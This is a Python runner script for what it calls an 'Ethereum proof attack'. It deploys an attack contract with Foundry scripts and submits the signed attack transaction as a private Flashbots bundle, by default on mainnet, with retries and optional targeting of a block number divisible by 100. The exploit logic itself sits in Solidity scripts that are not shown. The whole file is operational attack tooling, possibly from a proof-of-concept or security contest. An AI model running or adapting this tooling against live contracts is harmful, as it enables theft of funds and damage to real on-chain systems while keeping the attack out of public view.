#!/usr/bin/env python3

"""
Ethereum proof attack runner script.
Handles contract deployment and Flashbots submission.

Environment Variables:
- ETH_RPC_URL: HTTP JSON-RPC Ethereum provider URL
- PRIVATE_KEY: Private key of account which will execute the attack
- FLASHBOTS_RELAY_URL: (Optional) Custom Flashbots relay URL
- LOG_LEVEL: (Optional) Set the logging level. Default is 'INFO'

Usage:
python script/run_attack.py [--log-level LEVEL]
"""

import argparse
import json
import logging
import os
from enum import Enum
from pathlib import Path
from typing import Optional
from uuid import uuid4

from eth_account import Account
from eth_account.signers.local import LocalAccount
from web3 import Web3, HTTPProvider
from web3.exceptions import TransactionNotFound
from flashbots import flashbot
from flashbots.constants import FLASHBOTS_NETWORKS
from flashbots.types import Network
from eth_typing import HexStr
from eth_utils import to_hex
from dotenv import load_dotenv

# Constants
BLOCK_TIME_SECONDS = 12
MAX_RETRIES = 3
FLASHBOTS_DATA = "out/flashbots_data.json"
DEPLOY_BROADCAST = "broadcast/DeployAttack.s.sol"

# Configure logging
logging.basicConfig(
    level=os.environ.get("LOG_LEVEL", "INFO").upper(),
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

class EnumAction(argparse.Action):
    def __init__(self, **kwargs):
        enum_type = kwargs.pop("type", None)
        if enum_type is None:
            raise ValueError("type must be assigned an Enum when using EnumAction")
        if not issubclass(enum_type, Enum):
            raise TypeError("type must be an Enum when using EnumAction")
        kwargs.setdefault("choices", tuple(e.value for e in enum_type))
        super(EnumAction, self).__init__(**kwargs)
        self._enum = enum_type

    def __call__(self, parser, namespace, values, option_string=None):
        value = self._enum(values)
        setattr(namespace, self.dest, value)

def parse_arguments() -> Network:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Run the Ethereum proof attack")
    parser.add_argument(
        "--network",
        type=Network,
        action=EnumAction,
        default=Network.MAINNET,
        help=f"The network to use ({', '.join(e.value for e in Network)})",
    )
    parser.add_argument(
        "--log-level",
        type=str,
        choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
        default="INFO",
        help="Set the logging level",
    )
    parser.add_argument(
        "--target-hundred",
        action="store_true",
        help="Target the next block number divisible by 100",
    )
    args = parser.parse_args()
    return args.network, args.target_hundred

def load_environment() -> dict:
    """Load and validate environment variables."""
    env_path = Path(__file__).parent.parent / ".env"
    load_dotenv(env_path)
    
    eth_rpc_url = os.getenv("ETH_RPC_URL")
    if not eth_rpc_url:
        raise ValueError("ETH_RPC_URL not found in .env file")
    
    private_key = os.getenv("PRIVATE_KEY")
    if not private_key:
        raise ValueError("PRIVATE_KEY not found in .env file")
        
    if not private_key.startswith("0x"):
        private_key = f"0x{private_key}"
    
    w3 = Web3()
    account = Account.from_key(private_key)
    checksummed_address = w3.to_checksum_address(account.address)
    
    return {
        "eth_rpc_url": eth_rpc_url,
        "private_key": private_key,
        "checksummed_address": checksummed_address
    }

def setup_web3(network: Network, env_vars: dict) -> Web3:
    """Initialize Web3 with Flashbots support."""
    provider_url = env_vars["eth_rpc_url"]
    relay_url = FLASHBOTS_NETWORKS[network]["relay_url"]
    
    logger.info(f"Using RPC: {provider_url}")
    logger.info(f"Using Flashbots relay: {relay_url}")
    
    w3 = Web3(HTTPProvider(provider_url))
    account: LocalAccount = Account.from_key(env_vars["private_key"])
    logger.info(f"Using account: {account.address}")
    
    flashbot(w3, account, relay_url)
    return w3

def check_existing_contract(w3: Web3) -> Optional[str]:
    """Check if contract is already deployed and valid."""
    deploy_path = Path(DEPLOY_BROADCAST)
    if not deploy_path.exists():
        return None
        
    run_files = list(deploy_path.glob("*/run-latest.json"))
    if not run_files:
        return None
        
    latest_run = max(run_files, key=lambda x: x.stat().st_mtime)
    
    try:
        with open(latest_run) as f:
            data = json.load(f)
            contract_addr = data["transactions"][0]["contractAddress"]
            
            if not contract_addr or contract_addr == "null":
                return None
                
            contract_addr = w3.to_checksum_address(contract_addr)
            code = w3.eth.get_code(contract_addr)
            if code and code != "0x":
                logger.info(f"Using existing contract: {contract_addr}")
                return contract_addr
            return None
                
    except Exception as e:
        logger.error(f"Error checking existing contract: {e}")
        return None

def deploy_contract(w3: Web3) -> Optional[str]:
    """Deploy the attack contract."""
    logger.info("Deploying new attack contract...")
    
    try:
        import subprocess
        result = subprocess.run(
            ["forge", "script", "script/DeployAttack.s.sol", "--rpc-url", os.environ["ETH_RPC_URL"], "--broadcast"],
            capture_output=True,
            text=True,
            check=True
        )
        
        broadcast_files = list(Path(DEPLOY_BROADCAST).glob("*/run-latest.json"))
        if not broadcast_files:
            return None
            
        with open(broadcast_files[0]) as f:
            data = json.load(f)
            contract_addr = data["transactions"][0]["contractAddress"]
            
            if not contract_addr or contract_addr == "null":
                return None
                
            logger.info(f"Attack contract deployed at: {contract_addr}")
            return contract_addr
            
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to deploy contract: {e.stderr}")
        return None

def prepare_bundle(w3: Web3, contract_addr: str) -> Optional[dict]:
    """Prepare Flashbots bundle."""
    logger.info("Preparing Flashbots bundle...")
    
    try:
        # Set environment variable for forge script
        os.environ["ATTACK_CONTRACT"] = contract_addr
        
        import subprocess
        result = subprocess.run(
            ["forge", "script", "script/FlashbotsSubmit.s.sol", "--rpc-url", os.environ["ETH_RPC_URL"]],
            capture_output=True,
            text=True,
            check=True
        )
        
        # Read transaction data
        with open('transaction_data.txt', 'r') as f:
            transaction_data = f.read().strip()
            
        return {
            "contractAddress": contract_addr,
            "transactionData": transaction_data
        }
        
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to prepare bundle: {e.stderr}")
        return None

def create_transaction(w3: Web3, data: dict, network: Network, env_vars: dict) -> dict:
    """Create the attack transaction."""
    latest = w3.eth.get_block("latest")
    base_fee = latest["baseFeePerGas"]
    max_priority_fee = Web3.to_wei(15, "gwei")
    max_fee = base_fee + max_priority_fee + Web3.to_wei(10, "gwei")

    account = Account.from_key(env_vars["private_key"])
    nonce = w3.eth.get_transaction_count(account.address)
    
    return {
        "to": data["contractAddress"],
        "data": HexStr(data["transactionData"]),
        "gas": 1000000,
        "maxFeePerGas": max_fee,
        "maxPriorityFeePerGas": max_priority_fee,
        "chainId": FLASHBOTS_NETWORKS[network]["chain_id"],
        "nonce": nonce,
        "value": 0,
    }

def submit_bundle(w3: Web3, network: Network, env_vars: dict, target_hundred: bool) -> bool:
    """Submit bundle via Flashbots."""
    logger.info("Submitting bundle via Flashbots...")
    
    try:
        # Check for existing contract or deploy new one
        contract_addr = check_existing_contract(w3)
        if not contract_addr:
            contract_addr = deploy_contract(w3)
            if not contract_addr:
                return False
        
        # Prepare bundle
        bundle_data = prepare_bundle(w3, contract_addr)
        if not bundle_data:
            return False
            
        # Create and sign transaction
        tx = create_transaction(w3, bundle_data, network, env_vars)
        signed_tx = w3.eth.account.sign_transaction(tx, env_vars["private_key"])
        tx_hash = w3.to_hex(w3.keccak(signed_tx.rawTransaction))
        
        # Create bundle
        bundle = [{"signed_transaction": signed_tx.rawTransaction}]
        
        # Submit bundle
        current_block = w3.eth.block_number
        target_block = current_block + 1
        
        if target_hundred:
            # Calculate next block divisible by 100
            blocks_until_hundred = 100 - (current_block % 100)
            target_block = current_block + blocks_until_hundred
            logger.info(f"Targeting next block divisible by 100: {target_block}")
        
        retry_count = 0
        while retry_count < MAX_RETRIES:
            replacement_uuid = str(uuid4())
            logger.info(f"Attempt {retry_count + 1}/{MAX_RETRIES}")
            
            try:
                send_result = w3.flashbots.send_bundle(
                    bundle,
                    target_block_number=target_block,
                    opts={"replacementUuid": replacement_uuid}
                )
                
                if send_result and hasattr(send_result, 'bundle_hash'):
                    bundle_hash = send_result.bundle_hash() if callable(send_result.bundle_hash) else send_result.bundle_hash
                    logger.info(f"Bundle submitted successfully! Hash: {w3.to_hex(bundle_hash)}")
                    
                    stats_v1 = w3.flashbots.get_bundle_stats(
                        w3.to_hex(send_result.bundle_hash()), target_block
                    )
                    logger.info(f"bundleStats v1 {json.dumps(stats_v1, indent=4)}")

                    stats_v2 = w3.flashbots.get_bundle_stats_v2(
                        w3.to_hex(send_result.bundle_hash()), target_block
                    )
                    logger.info(f"bundleStats v2 {json.dumps(stats_v2, indent=4)}")

                    # Wait for inclusion
                    send_result.wait()
                    try:
                        receipts = send_result.receipts()
                        logger.info(f"Bundle was mined in block {receipts[0].blockNumber}")
                        return True
                    except TransactionNotFound:
                        logger.info(f"Bundle not found in block {target_block}")
                        cancel_res = w3.flashbots.cancel_bundles(replacement_uuid)
                        logger.info(f"Canceled {cancel_res}")
                        break
                    
            except Exception as e:
                logger.error(f"Error submitting bundle: {e}")
            
            retry_count += 1
            if retry_count < MAX_RETRIES:
                target_block += 1
                
        return False
                
    except Exception as e:
        logger.error(f"Bundle submission failed: {e}")
        return False

def main():
    # Parse arguments and setup
    network, target_hundred = parse_arguments()
    os.makedirs("out", exist_ok=True)
    os.makedirs("broadcast", exist_ok=True)
    
    # Load environment and setup web3
    env_vars = load_environment()
    w3 = setup_web3(network, env_vars)
    
    # Run attack
    if submit_bundle(w3, network, env_vars, target_hundred):
        logger.info("Attack completed successfully!")
        return 0
    else:
        logger.error("Attack failed")
        return 1

if __name__ == "__main__":
    exit(main()) 